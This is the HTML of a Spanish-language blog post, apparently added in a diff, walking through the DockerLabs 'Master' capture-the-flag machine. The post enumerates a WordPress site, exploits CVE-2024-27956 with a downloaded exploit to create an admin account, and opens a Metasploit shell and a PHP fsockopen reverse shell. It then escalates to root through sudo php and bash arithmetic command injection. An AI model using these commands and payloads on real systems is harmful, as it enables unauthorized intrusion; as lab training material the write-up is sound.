@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | Master</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg
+      stroke="currentColor"
+      fill="currentColor"
+      stroke-width="0"
+      viewBox="0 0 16 16"
+      height="1.2em"
+      width="1.2em"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
+      ></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Master</h2>
+          <small class="date">01 Jul 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">dockerlabs</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">medio</a>
+            
+          </div>
+        </div>
+        <div class="content"><p><img src="/assets/images/master/1.png" alt="image" /></p>
+
+<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Vemos que solo tiene el puerto <strong>80</strong> abierto. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-favicon: Unknown favicon MD5: CCF3F1622BBC8760E39AAB495FD4A9B1
+|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Master
+|_http-generator: WordPress 6.5.5
+MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Como vemos hay un <strong>wordpress 6.5.5</strong> corriendo. Para escanear el framework usamos la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code>, le pasamos como parametros el target con <code class="language-plaintext highlighter-rouge">—-url</code>, con <code class="language-plaintext highlighter-rouge">-e u,vp,vt</code> le indicamos que nos enumere los usuarios, los plugins vulnerables y los themes vulnerables y que busque los plugins de forma agresiva con <code class="language-plaintext highlighter-rouge">--plugins-detection</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://172.17.0.2 <span class="nt">-e</span> u,vp,vt <span class="nt">--plugins-detection</span> aggressive
+
+...
+wp-automatic
+ | Location: http://172.17.0.2/wp-content/plugins/wp-automatic/
+ | Latest Version: 3.98.0
+ | Last Updated: 2024-06-06T01:52:56.000Z
+ |
+ | Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  - http://172.17.0.2/wp-content/plugins/wp-automatic/, status: 200
+ |
+ | <span class="o">[!]</span> 7 vulnerabilities identified:
+ ....
+ 
+ | <span class="o">[!]</span> Title: Automatic &lt; 3.92.1 - Unauthenticated SQL Injection
+ |     Fixed <span class="k">in</span>: 3.92.1
+ |     References:
+ |      - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2024-27956
+ |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a
+ |
+....
+
+ User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] mario
+ | Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  - http://172.17.0.2/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Como vemos es vulnerable a <strong>Unauthenticated SQL Injection</strong> con un CVE <strong>CVE-2024-2795</strong>. Descargamos el siguiente exploit de github para explotar la vulnerabilidad:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/diego-tella/CVE-2024-27956-RCE/main/exploit.py
+</code></pre></div></div>
+
+<p>Lo ejecutamos y vemos que nos crea un usuario con rol de admistrador:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py http://172.17.0.2
+<span class="o">[</span>+] Exploit <span class="k">for </span>CVE-2024-27956
+<span class="o">[</span>+] Creating user eviladmin
+<span class="o">[</span>+] Giving eviladmin administrator permissions
+<span class="o">[</span>+] Exploit completed!
+<span class="o">[</span>+] administrator created: eviladmin:admin
+</code></pre></div></div>
+
+<p>Ahora para obtener una shell reverse vamos a usar <strong>Metasploit</strong>, lo abrimos con <code class="language-plaintext highlighter-rouge">msfconsole</code>. Después vamos a usar el exploit <strong>wp_admin_shell_upload</strong> que sirve para subir un plugin que genera para que nos de una shell reversa. En este caso voy a usar un payload para que solo me devuelva una shell y no una sesión de meterpreter. Ejecutamos <code class="language-plaintext highlighter-rouge">set payload generic/shell_reverse_tcp</code> :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use exploit/unix/webapp/wp_admin_shell_upload
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload generic/shell_reverse_tcp 
+payload <span class="o">=&gt;</span> generic/shell_reverse_tcp
+</code></pre></div></div>
+
+<p>Después vemos las opciones disponibles para que funcione el exploit con <code class="language-plaintext highlighter-rouge">options</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> options
+
+Module options <span class="o">(</span>exploit/unix/webapp/wp_admin_shell_upload<span class="o">)</span>:
+
+   Name       Current Settin  Required  Description
+              g
+   <span class="nt">----</span>       <span class="nt">--------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   PASSWORD                   <span class="nb">yes       </span>The WordPress passwor
+                                        d to authenticate wit
+                                        h
+   Proxies                    no        A proxy chain of form
+                                        at <span class="nb">type</span>:host:port[,ty
+                                        pe:host:port][...]
+   RHOSTS                     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, s
+                                        ee https://docs.metas
+                                        ploit.com/docs/using-
+                                        metasploit/basics/usi
+                                        ng-metasploit.html
+   RPORT      80              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL        <span class="nb">false           </span>no        Negotiate SSL/TLS <span class="k">for
+                                         </span>outgoing connections
+   TARGETURI  /               <span class="nb">yes       </span>The base path to the
+                                        wordpress application
+   USERNAME                   <span class="nb">yes       </span>The WordPress usernam
+                                        e to authenticate wit
+                                        h
+   VHOST                      no        HTTP server virtual h
+                                        ost
+
+Payload options <span class="o">(</span>generic/shell_reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an i
+                                     nterface may be specifie
+                                     d<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   WordPress
+</code></pre></div></div>
+
+<p>En nuestro caso cambiamos el <strong>rhost</strong>, la url, el <strong>lhost</strong>, nuestra ip, <strong>username</strong>, el user recien creado, y <strong>password</strong>, su password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost http://172.17.0.1
+rhost <span class="o">=&gt;</span> http://172.17.0.2
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost docker0
+lhost <span class="o">=&gt;</span> 172.17.0.1
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username eviladmin
+username <span class="o">=&gt;</span> eviladmin
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password admin
+password <span class="o">=&gt;</span> admin
+</code></pre></div></div>
+
+<p>Lo ejecutamos con <code class="language-plaintext highlighter-rouge">exploit</code> y obtenemos una shell como <strong>www-data</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> exploit
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 172.17.0.1:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using eviladmin:admin...
+<span class="o">[</span>+] Authenticated with WordPress
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the payload at /wp-content/plugins/YhxOuYmNHi/kMJyYmwgTI.php...
+<span class="o">[</span>+] Deleted kMJyYmwgTI.php
+<span class="o">[</span>+] Deleted YhxOuYmNHi.php
+<span class="o">[</span>+] Deleted ../YhxOuYmNHi
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>172.17.0.1:4444 -&gt; 172.17.0.2:48282<span class="o">)</span> at 2024-07-02 00:43:51 +0200
+
+<span class="nb">whoami
+</span>www-data
+</code></pre></div></div>
+
+<p>La shell que proporciona metasploit no me gusta mucho, por ello me voy a crear una shell con netcat. Nos ponemos a la escucha en nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
+listening on <span class="o">[</span>any] 8888 ...
+</code></pre></div></div>
+
+<p>Ejecutamos el siguiente payload para que genere la shell reversa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("172.17.0.1",8888);exec("/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div></div>
+
+<p>Y para terminar hacemos el tratamiento de la shell para tener una TTY completa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 8888
+listening on <span class="o">[</span>any] 8888 ...
+connect to <span class="o">[</span>172.17.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.17.0.2] 55124
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+script /dev/null <span class="nt">-qc</span> /bin/bash
+sh: 0: getcwd<span class="o">()</span> failed: No such file or directory
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+www-data@28f7a25fdecd:<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 8888
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 8888
+<span class="nb">ls
+</span>www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@28f7a25fdecd:<span class="nv">$ </span>reset
+</code></pre></div></div>
+
+<p>Ahora ya en nuestra máquina vemos con <code class="language-plaintext highlighter-rouge">sudo -l</code> si podríamos ejecutar algo como otro usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on 28f7a25fdecd:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
+    use_pty
+
+User www-data may run the following commands on 28f7a25fdecd:
+    <span class="o">(</span>pylon<span class="o">)</span> NOPASSWD: /usr/bin/php
+</code></pre></div></div>
+
+<h1 id="movimientos-laterales">Movimientos laterales</h1>
+
+<p>Podríamos ejecutar como <strong>pylon</strong> el comando <code class="language-plaintext highlighter-rouge">php</code> sin necesidad de contraseña. Vamos a <a href="https://gtfobins.github.io/gtfobins/php/#sudo">GTFOBins</a> y encontramos como ejecutarlo con <strong>sudo</strong> para hacer el movimiento lateral</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@28f7a25fdecd:<span class="nv">$ CMD</span><span class="o">=</span><span class="s2">"/bin/bash"</span>
+www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> pylon php <span class="nt">-r</span> <span class="s2">"system('</span><span class="nv">$CMD</span><span class="s2">');"</span>
+pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">whoami
+</span>pylon
+</code></pre></div></div>
+
+<p>Ya estamos como <strong>pylon</strong>. Ahora volvemos a mirar si podemos ejecutar algo como otro usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>pylon on 28f7a25fdecd:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+
+User pylon may run the following commands on 28f7a25fdecd:
+    <span class="o">(</span>mario<span class="o">)</span> NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
+</code></pre></div></div>
+
+<p>Como explico Mario en este <a href="https://youtube.com/shorts/30Z2QVJfhGs?feature=shared">short</a> en su canal de YouTube vamos a movernos al usuario mario usando esa técnica:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> mario /bin/bash /home/mario/pingusorpresita.sh
+Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[<span class="si">$(</span><span class="nb">whoami</span> <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
+mario
+https://www.youtube.com/@ElPinguinoDeMario
+
+<span class="c"># Funciona! Ahora ejecutamos una shell en bash</span>
+pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> mario /bin/bash /home/mario/pingusorpresita.sh
+Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[<span class="si">$(</span>bash  <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
+mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">whoami
+</span>mario
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Una vez estamos como mario hacemos el mismo proceso para convertirnos en root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>mario on 28f7a25fdecd:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
+    use_pty
+
+User mario may run the following commands on 28f7a25fdecd:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/bash /home/pylon/pylonsorpresita.sh
+    
+mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/bash /home/pylon/pylonsorpresit/bin/bash /home/pylon/pylonsorpresita.sh
+Escribe 1 para ver el canal de pylon: a[<span class="si">$(</span>bash  <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
+root@28f7a25fdecd:/home/mario# <span class="nb">cd</span> ~
+root@28f7a25fdecd:~# <span class="nb">hostname</span><span class="p">;</span> <span class="nb">whoami
+</span>28f7a25fdecd
+root
+root@28f7a25fdecd:~# 
+</code></pre></div></div>
+
+<p>Y con este terminamos la máquina.</p>
+</div>
+      </section>
+      <footer>
+  <p>&copy; 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
